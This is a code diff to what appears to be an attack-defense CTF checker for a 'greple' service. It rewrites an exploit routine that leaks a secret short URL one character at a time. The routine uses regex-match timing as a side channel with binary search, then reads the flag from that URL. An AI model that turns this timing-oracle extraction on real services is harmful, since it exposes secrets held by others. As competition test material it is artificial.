@@ -1,6 +1,5 @@
 """Checker for greple service."""
 
-import hashlib
 import json
 import math
 import pathlib
@@ -223,53 +222,6 @@ async def _test_for_regex_match(client: httpx.AsyncClient, q: str, regex: str) -
     return float(t[0]) < 0.1
 
 
-async def _divide_and_conquer(
-    client: httpx.AsyncClient,
-    attack_info: str,
-    prefix: str = _SHORT_URL_PREFIX,
-    candidates: str = _SHORT_URL_ALPHABET,
-    length: int = _SHORT_URL_LENGTH,
-) -> list[str]:
-    if not await _test_for_regex_match(
-        client,
-        attack_info,
-        attack_info.translate(_REGEX_ESCAPE)
-        + " "
-        + prefix.translate(_REGEX_ESCAPE)
-        + "["
-        + candidates.translate(_REGEX_ESCAPE)
-        + "]",
-    ):
-        return []
-
-    if len(candidates) == 1:
-        if length == 1:
-            return [prefix + candidates]
-
-        return await _divide_and_conquer(
-            client,
-            attack_info,
-            prefix + candidates,
-            _SHORT_URL_ALPHABET,
-            length - 1,
-        )
-
-    mid = len(candidates) // 2
-    return await _divide_and_conquer(
-        client,
-        attack_info,
-        prefix,
-        candidates[:mid],
-        length,
-    ) + await _divide_and_conquer(
-        client,
-        attack_info,
-        prefix,
-        candidates[mid:],
-        length,
-    )
-
-
 @_CHECKER.exploit(0)
 async def _exploit_sca(
     task: ExploitCheckerTaskMessage,
@@ -278,15 +230,33 @@ async def _exploit_sca(
     if task.attack_info is None:
         raise MumbleException("Missing attack info")
 
-    short_urls = await _divide_and_conquer(client, task.attack_info)
+    short_url = _SHORT_URL_PREFIX
 
-    for short_url in short_urls:
-        url = await _get_short_url(client, short_url)
-        flag = unquote(url.removeprefix(_FLAG_URL_PREFIX))
-        if hashlib.sha256(flag.encode()).hexdigest() == task.flag_hash:
-            return flag
+    for _ in range(_SHORT_URL_LENGTH):
+        lo = 0
+        hi = len(_SHORT_URL_ALPHABET) - 1
 
-    return None
+        while lo < hi:
+            mid = (lo + hi) // 2
+
+            if await _test_for_regex_match(
+                client,
+                task.attack_info,
+                task.attack_info.translate(_REGEX_ESCAPE)
+                + " "
+                + short_url.translate(_REGEX_ESCAPE)
+                + "["
+                + _SHORT_URL_ALPHABET[lo : mid + 1].translate(_REGEX_ESCAPE)
+                + "]",
+            ):
+                hi = mid
+            else:
+                lo = mid + 1
+
+        short_url += _SHORT_URL_ALPHABET[lo]
+
+    url = await _get_short_url(client, short_url)
+    return unquote(url.removeprefix(_FLAG_URL_PREFIX))
 
 
 def app() -> fastapi.FastAPI:
